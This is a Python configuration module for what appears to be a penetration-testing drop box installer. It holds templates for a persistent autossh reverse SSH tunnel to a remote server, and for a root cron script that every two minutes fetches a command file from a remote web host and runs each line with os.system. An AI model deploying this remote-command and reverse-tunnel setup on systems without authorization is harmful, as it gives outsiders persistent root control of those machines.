from pathlib import Path
from typing import Dict, List, Tuple

WEBCMD_PATH = '/opt/ptb'
WEBCMD_APP = 'webcmd.py'

WEBCMD_CRON = '*/2 * * * * root /opt/ptb/webcmd.py'

CONFIG_SECTIONS: Dict[str, List[Tuple]] = {
    'RemoteSSH': [
        ('Host', 'IP of remote SSH server:', ''),
        ('RemotePort', 'Port of remote SSH server:', 443),
        ('LocalPort',
         'Local port on remote SSH server for forwarding:', 2200),
        ('User', 'Username on remote SSH Server', '')
    ],
    'RemoteWeb': [
        ('Host',
         'Hostname or IP of remote web server for commands '
         '(e.g. example.com):', ''),
        ('FileName',
         'Name of hosted file containing the commands to execute:',
         'cmd.txt')
    ],
    'Local': [
        ('Upgrade',
         'Run apt-get upgrade?',
         'yes'),
        ('DistUpgrade',
         'Run apt-get dist-upgrade?',
         'yes'),
        ('SetupVNC',
         'Should a VNC server be set up on the pentest box? '
         '(won\'t start automatically)',
         'no'),
        ('AdditionalPackages',
         'Add additional apt packages to be installed (space separated)',
         'none')
    ]
}

REQUIRED_PACKAGES = ['autossh', 'openssh-server', 'sshpass']
VNC_PACKAGES = ['novnc', 'x11vnc']
HOME_PATH = Path().home()
SSH_KEY_PATH = HOME_PATH / '.ssh/dropbox'

SSH_SERVICE_TEMPLATE = """[Unit]
Description=AutoSSH to remote server after network comes online
After=network-online.target

[Service]
Environment="AUTOSSH_GATETIME=0"
ExecStart=/usr/bin/autossh -M 0 -o "ExitOnForwardFailure=yes" -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -N -R {{remote_forward_port}}:127.0.0.1:22 {{user}}@{{host}} -i {{key_path}} -p {{port}}

[Install]
WantedBy=multi-user.target
"""

WEBCMD_SCRIPT_TEMPLATE = """#!/bin/python3
import os
import hashlib
import urllib.request

FILE = '/opt/ptb/lastcmd'

with urllib.request.urlopen('https://{{host}}/{{filename}}') as cmd:
    commands = cmd.read().strip()
    hashed = hashlib.sha1(commands).hexdigest()

mode = 'r+' if os.path.exists(FILE) else 'w+'
with open(FILE, mode) as f:
    last = f.read()
    f.seek(0)
    if last != hashed:
        for command in commands.decode('utf-8').split('\\n'):
            os.system(command)
        f.write(hashed)
"""
